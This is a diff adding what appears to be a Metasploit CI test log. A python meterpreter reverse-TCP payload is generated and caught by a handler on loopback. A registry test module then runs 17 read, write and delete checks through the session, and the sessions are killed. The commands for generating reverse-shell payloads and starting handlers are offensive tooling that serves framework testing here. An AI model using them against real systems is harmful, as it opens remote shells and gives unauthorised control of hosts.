@@ -1,0 +1,43 @@
+use python/meterpreter_reverse_tcp
+msf6 post(test/get_env) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/pythonmeterpreter_reverse_tcp_session_tlv_logging20240117-3568-vzdjbbtxt
+msf6 payload(python/meterpreter_reverse_tcp) > msf6 payload(python/meterpreter_reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/pythonmeterpreter_reverse_tcp_session_tlv_logging20240117-3568-vzdjbbtxt
+msf6 payload(python/meterpreter_reverse_tcp) > generate -o D:/a/_temp/child-process-rb-python-meterpreter-reverse-tcp20240117-3568-tykrf.py -f raw AutoVerifySessionTimeout=30 lport=6005 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/pythonmeterpreter_reverse_tcp_debug_log20240117-3568-ljpt3ytxt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+[*] Writing 24924 bytes to D:/a/_temp/child-process-rb-python-meterpreter-reverse-tcp20240117-3568-tykrf.py...
+msf6 payload(python/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 4
+msf6 payload(python/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6005 
+[*] Meterpreter session 5 opened (127.0.0.1:6005 -> 127.0.0.1:50070) at 2024-01-17 18:06:24 +0000
+use test/registry
+msf6 post(test/registry) > run session=5 AddEntropy=true Verbose=true
+[*] Running against session 5
+[*] Session type is meterpreter and platform is windows
+[+] should evaluate key existence
+[*] PENDING: should evaluate value existence
+[+] should read values
+[+] should read values with a 32-bit view
+[+] should read values with a 64-bit view
+[+] should return normalized values
+[+] should enumerate keys and values
+[+] should create keys
+[+] should write REG_BINARY values
+[+] should write REG_DWORD values
+[+] should write REG_EXPAND_SZ values
+[+] should write REG_MULTI_SZ values
+[+] should write REG_QWORD values
+[+] should write REG_SZ values
+[+] should delete keys
+[+] should create unicode keys
+[+] should write REG_SZ unicode values
+[+] should delete unicode keys
+[*] Testing complete in 6.64 seconds
+[*] Passed: 17; Failed: 0; Skipped: 0
+[*] Post module execution completed
+msf6 post(test/registry) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 5 closed.
+msf6 post(test/registry) > Stopping all jobs...
+msf6 post(test/registry) > 
